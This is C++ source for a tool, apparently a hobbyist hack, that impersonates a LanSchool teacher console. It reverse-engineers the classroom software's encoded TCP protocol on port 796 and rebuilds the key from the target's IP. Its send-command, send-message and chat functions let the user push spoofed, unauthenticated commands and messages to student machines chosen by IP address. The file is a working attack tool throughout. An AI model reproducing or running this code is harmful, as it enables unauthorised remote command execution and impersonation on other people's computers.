//compile with -lws2_32 and -lole32
#include <winsock2.h>
#include <windows.h>
#ifndef _WIN32_IE
#define _WIN32_IE
#endif
#define INITGUID
#include <KnownFolders.h>
#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <string>
#include <thread>
#include <limits>
#include <algorithm>
#include <cctype>
#include <cmath>
#include <csignal>
#include <cstdlib>
#include <conio.h>
#include <ctype.h>
#include <bitset>
#include <direct.h>
#include <sys/stat.h>

#include <Shlobj.h>
// #include <Shlobj_core.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Ws2_32.lib")

// int key = 0x2A5FBD4;
int key;
int seed;
int currentInputLength = -1;
std::string currentInputString;
int pendingReads = 0;

int shiftLeft(int byte);
int shiftRight(int byte);
int getKeyByte(int key, int index);
void encode(uint8_t *originalArray, int key);

void connectToIP(char *ip_address);

std::string trim(const std::string &str);
COORD GetConsoleCursorPosition()
{
  CONSOLE_SCREEN_BUFFER_INFO cbsi;
  if (GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &cbsi))
  {
    return cbsi.dwCursorPosition;
  }
  else
  {
    COORD invalid = {0, 0};
    std::cout << "getConsoleCursorPosition failed.\n\n";
    return invalid;
  }
}
COORD GetConsoleDimensions()
{
  CONSOLE_SCREEN_BUFFER_INFO csbi;
  int columns, rows;

  GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
  columns = csbi.srWindow.Right - csbi.srWindow.Left + 1;
  rows = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;
  COORD dimensions = {(SHORT)columns, (SHORT)rows};
  return dimensions;
}
void gotoxy(short x, short y)
{
  HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
  COORD position = {x, y};

  SetConsoleCursorPosition(hStdout, position);
}
void clearLine()
{
  gotoxy(GetConsoleDimensions().X - 1, GetConsoleCursorPosition().Y);
  std::cout << " ";
  gotoxy(GetConsoleDimensions().X - 1, GetConsoleCursorPosition().Y - 1);
  for (int i = 0; i < GetConsoleDimensions().X - 1; i++)
  {
    std::cout << "\b \b";
  }
}
void clearScreen()
{
  HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
  COORD coordScreen = {0, 0};
  DWORD cCharsWritten;
  CONSOLE_SCREEN_BUFFER_INFO csbi;
  DWORD dwConSize;

  if (!GetConsoleScreenBufferInfo(hConsole, &csbi))
  {
    return;
  }

  dwConSize = csbi.dwSize.X * csbi.dwSize.Y;
  if (!FillConsoleOutputCharacter(hConsole,
                                  (TCHAR)' ',
                                  dwConSize,
                                  coordScreen,
                                  &cCharsWritten))
  {
    return;
  }
  if (!GetConsoleScreenBufferInfo(hConsole, &csbi))
  {
    return;
  }
  if (!FillConsoleOutputAttribute(hConsole,
                                  csbi.wAttributes,
                                  dwConSize,
                                  coordScreen,
                                  &cCharsWritten))
  {
    return;
  }
  SetConsoleCursorPosition(hConsole, coordScreen);
}

std::string getUsername();
void setUsername();
bool firstRun;

void sendCommand();
void sendMessage();
void beginChat();
bool runChatThread;
std::string inputString(int maxLength);
std::string handleInput(int maxLength);

std::string username;
int usernameLength;

PWSTR usernameWpath = NULL;
SOCKET s = INVALID_SOCKET;
WSADATA wsaData;
int iResult;
char *ip;

bool folderExists(const std::string &folderPath)
{
  struct stat info;
  if (stat(folderPath.c_str(), &info) != 0)
  {
    return false;
  }
  else if (info.st_mode & S_IFDIR)
  {
    return true;
  }
  else
  {
    return false;
  }
}
void signalHandler(int signum)
{
  std::cerr << "\n\n\nInterrupt signal: " << signum << " received.\n";
  runChatThread = false;
  closesocket(s);
  exit(signum);
}
int generateKeyFromIP(char *inverted_seed)
{
  seed = 0;
  seed |= ((inverted_seed[3] & 0xFF) << 24);
  seed |= ((inverted_seed[2] & 0xFF) << 16);
  seed |= ((inverted_seed[1] & 0xFF) << 8);
  seed |= ((inverted_seed[0] & 0xFF) << 0);

  // std::cout << "[*] Seed = 0x" << std::hex << seed << "\n";

  srand(seed);
  (void)rand();
  (void)rand();
  (void)rand();
  (void)rand();
  (void)rand();
  int top_half = rand() << 0x10;
  int bottom_half = rand();
  int newKey = top_half | bottom_half;
  // yes, this is how the program does it, it's not that i write bad code (even though i do)

  key = newKey;
  // std::cout << "[*] Key = 0x" << std::hex << key << "\n";
  return seed;
}
int main(int argc, char *argv[])
{
  signal(SIGINT, signalHandler);
  if (argc < 2)
  {
    std::cerr << "Not enough arguments!\nUsage: " << argv[0] << " <ip address>";
    system("timeout /t 5");
    return 1;
  }

  if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
  {
    std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
    return 1;
  }

  clearScreen();

  HRESULT hr = SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &usernameWpath);
  username = getUsername();
  std::wcout << L"[*] Config folder: " << usernameWpath << "\\AppData\\Local\\LanSchool_owo\\\n";
  ip = argv[1];

  connectToIP(ip);
  std::cout << "[*] Seed = 0x" << std::hex << seed << "\n";
  std::cout << "[*] Key = 0x" << std::hex << key << "\n";
  if (!firstRun)
  {
    std::cout << "Welcome back, " << ((username == "") ? "<no username>" : username) << "\n";
  }

  std::cout << "\
0. set username\n\
1. send command\n\
2. send message\n\
3. begin chat\n";

  std::cout << "select option: ";
  std::string input;
  int choice = -1;
  while (true)
  {
    input = std::cin.get();
    if (input == "\n")
    {
      std::cout << "select option: ";
    }
    else
    {
      try
      {
        choice = std::stoi(input);
        break;
      }
      catch (const std::invalid_argument &(void))
      {
        break;
      }
    }
  }
  switch (choice)
  {
  case 0:
    std::cin.get();
    setUsername();
    break;
  case 1:
    sendCommand();
    break;
  case 2:
    std::cin.get();
    sendMessage();
    break;
  case 3:
    std::cin.get();
    beginChat();
    break;
  default:
    std::cerr << "\nInvalid option selected; quitting!\n";
    return 1;
  }

  CoTaskMemFree(usernameWpath);
  closesocket(s);
  return 0;
}

int shiftLeft(int byte)
{
  if ((byte & 0x80) >> 7)
  {
    byte = byte << 1;
    byte = byte | 1;
  }
  else
  {
    byte = byte << 1;
  }
  return byte;
}
int shiftRight(int byte)
{
  if ((byte & 1))
  {
    byte = byte >> 1;
    byte = byte | 0x80;
  }
  else
  {
    byte = byte >> 1;
  }
  return byte;
}
int getKeyByte(int key, int index)
{
  return (key >> index * 8 & 0xFF);
}
byte encode_1(byte originalByte)
{
  byte tempByte = originalByte;
  tempByte = tempByte ^ getKeyByte(key, 1);
  tempByte = shiftLeft(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 0);
  tempByte = shiftRight(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 3);
  tempByte = shiftRight(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 2);
  tempByte = shiftLeft(tempByte);
  return tempByte;
}
byte encode_2(byte originalByte)
{
  byte tempByte = originalByte;
  tempByte = tempByte ^ getKeyByte(key, 2);
  tempByte = shiftRight(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 1);
  tempByte = shiftRight(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 0);
  tempByte = shiftRight(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 3);
  tempByte = shiftLeft(tempByte);
  return tempByte;
}
byte encode_3(byte originalByte)
{
  byte tempByte = originalByte;
  tempByte = tempByte ^ getKeyByte(key, 2);
  tempByte = shiftLeft(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 1);
  tempByte = shiftRight(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 0);
  tempByte = shiftLeft(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 0);
  tempByte = shiftLeft(tempByte);
  return tempByte;
}
byte encode_4(byte originalByte)
{
  byte tempByte = originalByte;
  tempByte = tempByte ^ getKeyByte(key, 3);
  tempByte = shiftRight(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 2);
  tempByte = shiftLeft(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 1);
  tempByte = shiftLeft(tempByte);
  tempByte = tempByte ^ getKeyByte(key, 0);
  tempByte = shiftRight(tempByte);
  return tempByte;
}

void encode(uint8_t *originalArray, int key)
{
  originalArray[0] = encode_1(originalArray[0]);
  originalArray[1] = encode_2(originalArray[1]);
  // originalArray[2] = encode_1(originalArray[2]);
  // originalArray[3] = encode_1(originalArray[3]);
  originalArray[4] = encode_1(originalArray[4]);
  originalArray[5] = encode_2(originalArray[5]);
  originalArray[6] = encode_3(originalArray[6]);
  originalArray[7] = encode_4(originalArray[7]);
  originalArray[8] = encode_1(originalArray[8]);
  originalArray[9] = encode_2(originalArray[9]);
}

void connectToIP(char *ip_address)
{
  s = INVALID_SOCKET;
  struct addrinfo *result = NULL,
                  *ptr = NULL,
                  hints;

  ZeroMemory(&hints, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  iResult = getaddrinfo(ip_address, "796", &hints, &result);
  if (iResult != 0)
  {
    printf("getaddrinfo failed: %d\n", iResult);
    WSACleanup();
    exit(1);
  }

  ptr = result;
  s = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
  if (s == INVALID_SOCKET)
  {
    printf("Error at socket(): %ld\n", WSAGetLastError());
    freeaddrinfo(result);
    WSACleanup();
    exit(1);
  }

  iResult = connect(s, ptr->ai_addr, (int)ptr->ai_addrlen);
  if (iResult == SOCKET_ERROR)
  {
    closesocket(s);
    s = INVALID_SOCKET;
  }

  freeaddrinfo(result);
  if (s == INVALID_SOCKET)
  {
    printf("Unable to connect to server!\n");
    WSACleanup();
    exit(1);
  }
  struct sockaddr *sockaddr_ptr = ptr->ai_addr;
  char *sa_data = sockaddr_ptr->sa_data + 2;
  generateKeyFromIP(sa_data);
}

std::string trim(const std::string &str)
{
  // Find the first non-space character
  auto start = std::find_if_not(str.begin(), str.end(), [](unsigned char ch)
                                { return std::isspace(ch); });

  // Find the last non-space character
  auto end = std::find_if_not(str.rbegin(), str.rend(), [](unsigned char ch)
                              { return std::isspace(ch); })
                 .base();

  // Return the trimmed string
  return (start < end) ? std::string(start, end) : std::string();
}

std::string getUsername()
{
  std::string tempUsername;

  std::wstring userFolderPath(usernameWpath);
  std::string userFolderPathStr(userFolderPath.begin(), userFolderPath.end());
  std::string usernameConfigPath = userFolderPathStr + "\\AppData\\Local\\LanSchool_owo\\username.txt";
  std::ifstream inputUsernameConfigFileHandle(usernameConfigPath);

  if (inputUsernameConfigFileHandle.is_open())
  {
    std::getline(inputUsernameConfigFileHandle, tempUsername);
    inputUsernameConfigFileHandle.close();
  }
  if (tempUsername == "$empty")
  {
    return "";
  }
  else if (tempUsername == "")
  {
    firstRun = true;
    setUsername();
    return username;
  }
  return trim(tempUsername);
}
void setUsername()
{

  std::wstring userFolderPath(usernameWpath);
  std::string userFolderPathStr(userFolderPath.begin(), userFolderPath.end());
  std::string usernameConfigPath = userFolderPathStr + "\\AppData\\Local\\LanSchool_owo\\username.txt";
  std::string configFolderPath = (userFolderPathStr + "\\AppData\\Local\\LanSchool_owo\\");
  if (!folderExists(configFolderPath))
  {
    if (!_mkdir(configFolderPath.c_str()))
    {
      std::cout << "[*] Config folder created!\n";
    }
    else
    {
      std::cout << "[!] Failed to create config folder!\n";
      exit(1);
    }
  }

  std::ifstream inputUsernameConfigFileHandle(usernameConfigPath);
  if (inputUsernameConfigFileHandle.is_open())
  {
    std::getline(inputUsernameConfigFileHandle, username);
    inputUsernameConfigFileHandle.close();
  }

  if (username != "")
  {
    std::cout << "Old username: " << ((username == "$empty") ? "<no username>" : username) << "\n";
  }

  std::string newUsername = "$failed";
  while (newUsername == "$failed")
  {
    std::cout << "Please set a username: ";
    newUsername = inputString(64);
  }

  std::ofstream outputUsernameConfigFileHandle(usernameConfigPath);
  if (outputUsernameConfigFileHandle.is_open())
  {
    outputUsernameConfigFileHandle << newUsername;
    std::cout << "Your new username is: " << ((newUsername == "$empty") ? "<no username>\n" : newUsername + "\n");
    username = newUsername;
    outputUsernameConfigFileHandle.close();
  }
}

std::string inputString(int maxLength)
{
  std::string returnString;
  std::string temp;
  while (true)
  {
    temp = std::cin.get();
    if (temp == "\n")
    {
      returnString = trim(returnString);
      if (returnString == "")
      {
        returnString = "";
        int ch;
        std::cout << "Are you sure you want to enter an empty string? [Y/N] ";
        do
        {
          ch = _getch();
          ch = toupper(ch);
        } while (ch != 'Y' && ch != 'N');

        _putch(ch);
        _putch('\r'); // Carriage return
        _putch('\n'); // Line feed
        if (ch == 'Y')
        {
          returnString = "$empty";
          break;
        }
        else
        {
          return "$failed";
        }
      }
      else if (returnString.length() > maxLength)
      {
        printf("Please keep the input shorter than %d characters.", maxLength);
        // std::cout << "Please keep the input shorter than " << maxLength << " characters.";
        returnString = "";
      }
      else
      {
        break;
      }
    }
    else
    {
      returnString += temp;
    }
  }
  return returnString;
}
std::string handleInput(int maxLength)
{
  currentInputString = "";
  currentInputLength = 0;
  char ch;
  std::cout << "> ";
  while (true)
  {
    ch = _getch();
    if (ch == 13)
    {
      break;
    }
    else if (ch == 8)
    {
      if (!currentInputString.empty())
      {
        if (GetConsoleCursorPosition().X == 0)
        {
          currentInputString.pop_back();
          currentInputLength--;
          for (int i = 0; i < std::ceil((float)(currentInputLength + 2) / (float)GetConsoleDimensions().X); i++)
          {
            gotoxy(GetConsoleCursorPosition().X, GetConsoleCursorPosition().Y - 1);
            clearLine();
          }
          std::cout << "> " << currentInputString;
        }
        else
        {
          currentInputLength--;
          currentInputString.pop_back();
          std::cout << "\b \b";
        }
      }
    }
    else if (currentInputLength < maxLength && (ch >= 32 && ch <= 126))
    {
      currentInputLength++;
      currentInputString += ch;
      std::cout << ch;
    }
    else if (ch == 3)
    {
      std::cout << "$exit\n";
      return "$exit";
    }
  }
  currentInputLength = -1;
  std::cout << "\n";
  std::string tempString = currentInputString;
  currentInputString = "";
  return tempString;
}

void sendCommand()
{

  std::cin.get();

  std::string command = "$failed";
  while (command == "$failed")
  {
    std::cout << "Enter command (no spaces): ";
    command = inputString(64);
  }
  if (command == "$empty")
  {
    command = "";
  }

  int recvBufLen = 128;

  uint8_t data[512] = {0x3b, 0x03, 0x01, 0x00, 0xda, 0xd1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  memset(data + 10, 0, sizeof(data) - 10);

  usernameLength = (int)username.length();
  int commandLength = (int)command.length();

  data[14] = (uint8_t)usernameLength; // username length
  for (int i = 17, j = 0; i < (17 + usernameLength); i++, j++)
  {
    data[i] = username[j];
  }
  data[82] = (uint8_t)commandLength;
  data[6] = (commandLength * 2) + 0x57;
  for (int i = 86, j = 0; i < (87 + commandLength); i++, j++)
  {
    data[i] = command[j];
  }
  for (int i = (86 + commandLength); i < 512; i++)
  {
    data[i] = 0x00;
  }
  encode(data, key);

  iResult = send(s, reinterpret_cast<const char *>(data), 87 + commandLength * 2, 0);
  if (iResult != (87 + commandLength * 2))
  {
    std::cerr << "\nSend failed: " << WSAGetLastError();
    closesocket(s);
    exit(1);
  }
  char recvData[0xFF];
  iResult = recv(s, recvData, 0xFF, 0);
  while (iResult == -1)
  {
    std::cout << "Failed (" << WSAGetLastError() << ") retrying..\n";
    closesocket(s);
    connectToIP(ip);
    send(s, reinterpret_cast<const char *>(data), 87 + commandLength * 2, 0);
    iResult = recv(s, recvData, 0xFF, 0);
    std::this_thread::sleep_for(std::chrono::milliseconds(250));
  }

  std::cout << "Success, command sent to " << ip << " :3";

  return;
}

void sendMessage()
{

  usernameLength = (int)username.length();

  std::string message = "$failed";
  while (message == "$failed")
  {
    std::cout << "Enter message: ";
    message = inputString(100);
  }
  if (message == "$empty")
  {
    message = "";
  }

  int messageLength = (int)message.length();
  uint8_t data[512] = {0x1d, 0x03, 0x01, 0x00, 0xda, 0xd1};
  memset(data + 6, 0, sizeof(data) - 6);
  data[6] = messageLength + 139;
  for (int i = 10, j = 0; i < 74 && j < usernameLength; i++, j++)
  {
    data[i] = username[j];
  }
  for (int i = 138, j = 0; i < (messageLength + 138); i++, j++)
  {
    data[i] = message[j];
  }
  encode(data, key);
  closesocket(s);
  connectToIP(ip);
  iResult = send(s, reinterpret_cast<const char *>(data), 139 + messageLength, 0);
  if (iResult != (139 + messageLength))
  {
    std::cerr << "\nSend failed: " << WSAGetLastError();
    closesocket(s);
    exit(1);
  }
  std::cout << "Success, message sent to " << ip << " :3";
  return;
}

void keepAliveThread()
{
  while (runChatThread)
  {
    uint8_t data[11] = {0x47, 0x03, 0x01, 0x00, 0xda, 0xd1, 0x0b, 0x00, 0x00, 0x00, 0x08}; // keep-alive-packet-thingy
    encode(data, key);
    // memset(data + 11, 0, sizeof(data) - 11);
    iResult = send(s, reinterpret_cast<const char *>(data), 11, 0);
    pendingReads++;
    if (iResult != 11)
    {
      std::cerr << "\nSend failed: " << WSAGetLastError();
      closesocket(s);
      exit(1);
    }
    for (int i = pendingReads; i > 0; i--)
    {
      char recvData[0xFF];
      char messageBuffer[0xFF];
      int bytesReceived = 8;
      memset(messageBuffer, 0, sizeof(messageBuffer));
      iResult = recv(s, recvData, 8, 0);
      if (iResult == -1)
      {
        std::cout << "[!] Recv failed (" << WSAGetLastError() << ")\n";
        signalHandler(0);
      }
      else
      {
        memcpy(messageBuffer, recvData, 8);
        int totalLength = recvData[6];

        while (bytesReceived < totalLength)
        {
          int remaining = totalLength - bytesReceived;
          iResult = recv(s, messageBuffer + bytesReceived, remaining, 0);
          // std::cout << "\nrecv\n";
          if (iResult == -1)
          {
            std::cout << "[!] Recv failed (" << WSAGetLastError() << ")\n";
            signalHandler(0);
            break;
          }

          bytesReceived += iResult;
        }
      }
      // message starts at [8+6] and ends with a null byte (0x00)

      if (messageBuffer[6] > 0xF)
      {
        clearLine();
        std::cout << "Student: ";
        for (int i = 0xE; i < bytesReceived; i++)
        {
          printf("%c", messageBuffer[i]);
        }
        std::cout << "\n";
        std::cout << "> " << currentInputString;
      }
      pendingReads--;
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(100));
  }
}

void beginChat()
{
  clearScreen();
  int consoleHeight = GetConsoleDimensions().X;
  COORD bottomLine = {0, (SHORT)--consoleHeight};
  SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), bottomLine);

  closesocket(s);
  connectToIP(ip);

  runChatThread = true;
  std::thread chatThreadInstance(keepAliveThread);

  std::string message = "$failed";

  while (true)
  {
    message = handleInput(1000);
    int messageLength = (int)message.length();
    if (message == "$exit" || message == "$hide")
    {
      uint8_t data[11] = {0x47, 0x03, 0x01, 0x00, 0xda, 0xd1, 0x0b, 0x00, 0x00, 0x00, 0x02};
      encode(data, key);
      iResult = send(s, reinterpret_cast<const char *>(data), 11, 0);
      if (iResult != 11)
      {
        std::cerr << "\nSend failed: " << WSAGetLastError();
        if (message == "$exit")
        {
          runChatThread = false;
          closesocket(s);
          exit(1);
        }
      }
      else if (message == "$exit")
      {
        runChatThread = false;
        return;
      }
    }
    else
    {
      uint8_t data[512] = {0x47, 0x03, 0x01, 0x00, 0xda, 0xd1, 0x00 /*length (2)*/, 0x00 /*length (1)*/, 0x00, 0x00, 0x05};
      data[6] = ((messageLength + 141) & 0xFF);
      data[7] = ((messageLength + 141) & 0xFF00) >> 8;
      memset(data + 11, 0, sizeof(data) - 11);
      for (int i = 12, j = 0; i < (12 + usernameLength); i++, j++)
      {
        data[i] = username[j];
      }
      // data[6] = 141 + messageLength;
      for (int i = 140, j = 0; i < (140 + messageLength); i++, j++)
      {
        data[i] = message[j];
      }

      // 0x08 keep-alive
      // 0x05 message
      // 0x02 end

      encode(data, key);
      iResult = send(s, reinterpret_cast<const char *>(data), 141 + messageLength, 0);
      pendingReads++;
      if (iResult != 141 + message.length())
      {
        std::cerr << "\nSend failed: " << WSAGetLastError() << "\n";
        closesocket(s);
        exit(1);
      }
    }
  }
}